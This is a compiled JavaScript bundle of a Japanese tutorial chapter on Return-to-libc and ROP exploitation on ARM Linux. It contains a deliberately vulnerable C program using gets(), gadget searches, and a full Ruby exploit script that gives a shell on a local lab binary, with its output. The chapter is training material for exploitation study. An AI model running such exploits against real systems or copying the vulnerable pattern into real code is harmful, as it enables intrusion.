(window.webpackJsonp=window.webpackJsonp||[]).push([[9],{214:function(t,s,a){"use strict";a.r(s);var n=a(0),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"_3-return-to-libc"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-return-to-libc","aria-hidden":"true"}},[t._v("#")]),t._v(" 3. Return to libc")]),t._v(" "),a("p",[t._v("前章で、スタック領域にシェルコードを配置して実行していました。しかしながら、本手法はNX 機能を無効化している場合やある領域に実行権限がある場合のみ可能な攻撃手段です。近年ではデフォルトで有効なため、Return to libc と呼ばれるテクニックを使いバイパスします。本章では、このReturn to libc というテクニックについて原理を学び演習問題を通して実践的な理解を深めます。")]),t._v(" "),a("h2",{attrs:{id:"_3-1-return-to-libc-とは"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-1-return-to-libc-とは","aria-hidden":"true"}},[t._v("#")]),t._v(" 3.1 Return to libc とは")]),t._v(" "),a("p",[t._v("Return to libc は、多くの場合標準で読み込んでおり実行権限のあるglibcの関数などにジャンプし呼び出す攻撃手法のことです。libcには、皆さんご存知の"),a("code",[t._v("printf")]),t._v("関数やOSのコマンド実行をする"),a("code",[t._v("system")]),t._v("関数をはじめとしてかなり多くの関数があります。特にExploit では、"),a("code",[t._v("system")]),t._v(" 関数や"),a("code",[t._v("execve")]),t._v(" 系関数は使う機会が多いと思います。では、実際にどのような攻撃なのか具体的な例を見ていきましょう。しかしながら、libcのアドレスはASLR（Address Space Layout Randomization）機能によって、ランダム化されており特定は困難です、そこで通常Retrun to libc の攻撃を使うためには、他の脆弱性などでlibc のアドレスをリークし、差分を引くことでlibcのベースアドレスを算出し、算出したベースアドレスに呼びたい関数のオフセットを足すことで、実際のlibc内の関数のアドレスなどを算出します。libc の関数のオフセットを求める際には、"),a("code",[t._v("nm")]),t._v(" コマンドを利用します。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ nm -D /lib/arm-linux-gnueabihf/libc.so.6  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("grep")]),t._v(" system\n000389c8 T __libc_system\n00109eb0 T svcerr_systemerr\n000389c8 W system\n")])])]),a("p",[t._v("また、ある実行ファイルにリンクされているライブラリが何かを知りたければ、"),a("code",[t._v("ldd")]),t._v(" コマンドを利用することで確認することができます。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ ldd ret2libc\n        /usr/lib/arm-linux-gnueabihf/libarmmem-"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("${PLATFORM}")]),t._v(".so "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /usr/lib/arm-linux-gnueabihf/libarmmem-v6l.so "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xb6f28000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        libc.so.6 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/arm-linux-gnueabihf/libc.so.6 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xb6dd8000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        /lib/ld-linux-armhf.so.3 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xb6f3c000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),a("p",[t._v("この際、括弧でくくられているアドレスが、ベースアドレスです。ASLR 環境配下だと上記コマンド結果は、実行するたびに異なるアドレスになります。しかしながら、アドレスのランダム化される範囲は少なく、特に末尾3桁は0で固定されています。オフセットなどを減算して末尾3桁が0ではない場合は、正しくベースアドレスを算出できていないので、もう一度計算方法を見直してみましょう。")]),t._v(" "),a("p",[t._v("今回の演習問題に使うコードを見てみましょう。")]),t._v(" "),a("div",{staticClass:"language-c extra-class"},[a("pre",{pre:!0,attrs:{class:"language-c"}},[a("code",[a("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("#"),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" argc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" argv"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("30")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("setbuf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("stdout")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("NULL")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"libc address: %p\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("stdout")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("gets")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("このソースコードでは、"),a("code",[t._v("gets")]),t._v(" 関数が使われているためバッファオーバーフローが起こることがわかります。前章の話しを踏まえて、リターンアドレスを上書きするまでに必要なペイロードのサイズを確かめてみてください。ここでは割愛しますが、36バイトのパディングを入れることでリターンアドレスを書き換えることがわかります。次に、libcアドレスのベースアドレスを特定します。このソースコードでは、"),a("code",[t._v("stdout")]),t._v(" のアドレスを事前にリークしてくれています。そこで、"),a("code",[t._v("nm")]),t._v(" コマンドを使って"),a("code",[t._v("stdout")]),t._v(" のアドレスオフセットを調べてましょう。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("nm -D /lib/arm-linux-gnueabihf/libc.so.6  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("grep")]),t._v(" -w stdout\n0014ad90 D _IO_2_1_stdout_\n0014ae34 D stdout\n")])])]),a("p",[t._v("この結果から、2つ同じような名前が出ていることがわかります。このうち1つ目が"),a("code",[t._v("stdout")]),t._v("の実態になっています。"),a("code",[t._v("stdout")]),t._v("は、"),a("code",[t._v("_IO_2_1_stdout_")]),t._v(" を指しており、"),a("code",[t._v("_IO_2_1_stdout_")]),t._v("が実際の標準出力用のファイルポインタを指しています。そのため、0x14ad90 がオフセットだとわかりました。では実際にこのコードを実行してみましょう。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ ./ret2libc\n./ret2libc\nlibc address: 0xb6f16d90\n")])])]),a("p",[t._v("コードを実行すると、アドレスの末尾が0xd90になっており、調べて判明したオフセットを引くことで末尾3桁が0になりlibcのベースアドレスが求められそうなことがわかります。")]),t._v(" "),a("p",[t._v("次に、どのようなペイロードを送り込んでReturn to libcを実行するのかを考えていきます。今回は、libc内にある"),a("code",[t._v("system")]),t._v(" 関数を用いて、"),a("code",[t._v('system("/bin/sh")')]),t._v(" を実行することでシェルを起動させる方針です。そのため、先程のlibc ベースアドレスに、"),a("code",[t._v("system")]),t._v(" 関数のアドレスオフセットを足すことで実際の"),a("code",[t._v("system")]),t._v("関数アドレスがわかります。次に、引数を設定する必要があります。実は、"),a("code",[t._v('"/bin/sh"')]),t._v(" という文字列はlibc内に含まれています。こちらも関数のオフセットと同じ要領で、オフセットを算出し、ベースアドレスに足すことで実際のアドレスを得ることができます。文字列の格納されているアドレスのオフセットが知りたい場合は、"),a("code",[t._v("strings")]),t._v(" コマンドを用います。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ strings -tx -a /lib/arm-linux-gnueabihf/libc.so.6  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("grep")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/bin/sh"')]),t._v("\n 12bb6c /bin/sh\n")])])]),a("p",[t._v("上記結果より、オフセットは0x12bb6cだとわかりました。ベースアドレスにこの値を足すことで実際の"),a("code",[t._v('"/bin/sh"')]),t._v(" のアドレスが求まりそうです。さて、ここまでで実際に必要なアドレスたちの算出は終わりました。次にどのようにして第1引数であるr0レジスタに"),a("code",[t._v('"/bin/sh"')]),t._v("のアドレスを設定した状態で、"),a("code",[t._v("system")]),t._v(" 関数を呼び出すかについて考えていきます。こういう際に便利なのが、"),a("code",[t._v("pop")]),t._v(" 命令です。"),a("code",[t._v("pop")]),t._v(" 命令は、スタックに配置されている値をレジスタにコピーする命令です。実行ファイルやlibcバイナリの中には、こういった"),a("code",[t._v("pop")]),t._v(" 命令が数多く含まれています。そこで、そういった"),a("code",[t._v("pop")]),t._v(" 命令にまずは直接ジャンプして、スタックに配置した引数をレジスタに移す処理をした後に、"),a("code",[t._v("system")]),t._v(" 関数を呼び出すことを行います。こういった"),a("code",[t._v("pop")]),t._v(" 命令や"),a("code",[t._v("bx")]),t._v("で終わるコードの断片（これらのコードをROP Gadgetと言う場合があります）をつなげていくことをROP（Return Oriented Programming）と呼びます。この攻撃はかなり複雑なコードも場合によっては実現可能なためとても便利な手法です。")]),t._v(" "),a("p",[t._v("では、バイナリ中から"),a("code",[t._v("pop")]),t._v(" 命令を用いたコードを見つけてみましょう。ここでは、すでにlibcのベースアドレスが既知なため、libcから探します。一般にlibc のほうが多くの関数やコードが詰まっているため便利なROP Gadgetが多く存在します。ROP Gadgetを探す場合は、"),a("a",{attrs:{href:"https://github.com/0vercl0k/rp",target:"_blank",rel:"noopener noreferrer"}},[t._v("rp++"),a("OutboundLink")],1),t._v(" を使うのが代表的ですが、どうやらrp++はARMなどには対応していないようなので他のソフトウェアを使います。rp++以外に代表的なのは、"),a("a",{attrs:{href:"https://github.com/JonathanSalwan/ROPgadget",target:"_blank",rel:"noopener noreferrer"}},[t._v("ROPGadget"),a("OutboundLink")],1),t._v(" や "),a("a",{attrs:{href:"https://github.com/sashs/Ropper",target:"_blank",rel:"noopener noreferrer"}},[t._v("ropper"),a("OutboundLink")],1),t._v(" です。ここでは、ropper を採用しました。特に深い意味はなくROPGadgetよりは新しいという点ぐらいで選んでいます。ropper のインストールは"),a("code",[t._v("pip install ropper")]),t._v(" で入りますが、Qemu環境で入れようとするとビルドに時間がかかるため、ホスト環境に入れてしまうことを強くおすすめします。実際にropper を使ってROP Gadgetを検索してみましょう。今回検索したいのは、r0とpcにpopすることができるROP Gadgetです。ropper のオプションでは、"),a("code",[t._v("-f")]),t._v(" でファイルを選び、"),a("code",[t._v("--search")]),t._v(" で探すGadgetの文字列を設定できます。今回は試しに、r0のpopから始まるものを設定してみます。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("div",{staticClass:"highlight-lines"},[a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("div",{staticClass:"highlighted"},[t._v(" ")]),a("br")]),a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ ropper -f libc.so.6  --search "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"pop {r0"')]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("INFO"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Load gadgets from cache\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("LOAD"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" loading"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(". "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("100")]),t._v("%\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("LOAD"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" removing double gadgets"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(". "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("100")]),t._v("%\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("INFO"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Searching "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" gadgets: pop "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("r0\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("INFO"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" File: libc.so.6\n0x000da9c0: pop "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("r0, r1, r2, r3, ip, lr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" bx "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("ip")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n0x000791fc: pop "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("r0, r4, pc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),a("p",[t._v("実行結果の2つ目に着目してください。途中でr4レジスタのpop が入っていますが、今回設定したいr0とpcの2つのレジスタにpopすることができそうです。今回はこのROP Gadgetを使うことにしましょう。")]),t._v(" "),a("p",[t._v("ここまでのアドレスや得たROP Gadgetを用いてスタックに配置するペイロードを図示すると以下のようになります。")]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",{staticStyle:{"text-align":"left"}},[t._v("値")])])]),t._v(" "),a("tbody",[a("tr",[a("td",{staticStyle:{"text-align":"left"}},[t._v('"A" * 36')])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[t._v("pop {r0, r4, pc}")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[t._v('"/bin/sh" のアドレス')])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[t._v('"AAAA"')])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[t._v("system 関数のアドレス")])])])]),t._v(" "),a("p",[t._v("大まかに挙動をまとめると、まずはじめにバッファオーバーフローを用いて、リターンアドレスを"),a("code",[t._v("pop {r0, r4, pc}")]),t._v(' で上書きします。そうすると、この命令がスタックに配置されている"/bin/sh"のアドレスをr0に、"AAA"という今回は不要な値をr4に、そして次に実行する命令を指すpcにsystem関数のアドレスを設定します。これにより、'),a("code",[t._v('system("/bin/sh")')]),t._v(" を実行することができるようになります。")]),t._v(" "),a("h2",{attrs:{id:"_3-2-return-to-libcを用いたシェル奪取"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-return-to-libcを用いたシェル奪取","aria-hidden":"true"}},[t._v("#")]),t._v(" 3.2 Return to libcを用いたシェル奪取")]),t._v(" "),a("p",[t._v("では実際に構築したペイロードで攻撃が成功するかを確かめてみましょう。引き続き"),a("code",[t._v("socat")]),t._v(" でバイナリを待ち受けます。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ socat tcp-l:8888,reuseaddr,fork exec:./ret2libc\n")])])]),a("p",[t._v("次に、ここまでの情報を踏まえて作成したExploit コードを以下に以下に示します。libcのアドレスが正しく計算されているかなど、デバッグ情報を出すようにしています。")]),t._v(" "),a("div",{staticClass:"language-ruby extra-class"},[a("pre",{pre:!0,attrs:{class:"language-ruby"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#!/usr/bin/env ruby")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# coding: utf-8")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("require")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'pwn'")]),t._v("\n\nhost "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'localhost'")]),t._v("\nport "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("8888")]),t._v("\nz "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("Sock")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("host")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" port\ntmp "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" z"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recvline\nlibc_address "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" tmp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("match"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/: (.+)\\n/")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("to_i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nlibc "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("ELF")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"./libc.so.6"')]),t._v("\nlibc_base "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" libc_address "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x014ad90")]),t._v("\nlibc_system "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" libc_base "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" libc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("symbols"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"__libc_system"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\nlibc_binsh "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" libc_base "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x12bb6c")]),t._v("\npop_r0_r4_pc "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" libc_base "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x000791fc")]),t._v("\nputs "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"libc base    @ 0x'),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token delimiter tag"}},[t._v("#{")]),t._v("libc_base"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("to_s"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token delimiter tag"}},[t._v("}")])]),t._v('"')]),t._v("\nputs "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"libc system  @ 0x'),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token delimiter tag"}},[t._v("#{")]),t._v("libc_system"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("to_s"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token delimiter tag"}},[t._v("}")])]),t._v('"')]),t._v("\nputs "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"libc /bin/sh @ 0x'),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token delimiter tag"}},[t._v("#{")]),t._v("libc_binsh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("to_s"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token delimiter tag"}},[t._v("}")])]),t._v('"')]),t._v("\npayload "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"A"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("36")]),t._v("\npayload "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pop_r0_r4_pc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\npayload "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("libc_binsh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\npayload "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"AAAA"')]),t._v("\npayload "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("libc_system"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nz"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendline payload\nz"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("interact\n")])])]),a("p",[t._v("上記コードを実行した結果が以下です。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("./solve2.rb\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("INFO"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"ARM_Exploit/docs/chapter03/libc.so.6"')]),t._v("\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\nlibc base    @ 0xb6e20000\nlibc system  @ 0xb6e589c8\nlibc /bin/sh @ 0xb6f4bb6c\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("INFO"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Switching to interactive mode\n"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("id")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("uid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pi"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("gid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pi"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("groups")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pi"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",4"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("adm"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",20"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("dialout"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",24"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("cdrom"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",27"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("sudo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",29"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("audio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",44"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("video"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",46"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("plugdev"),a("span",{pre:!0,attrs:{class:"token 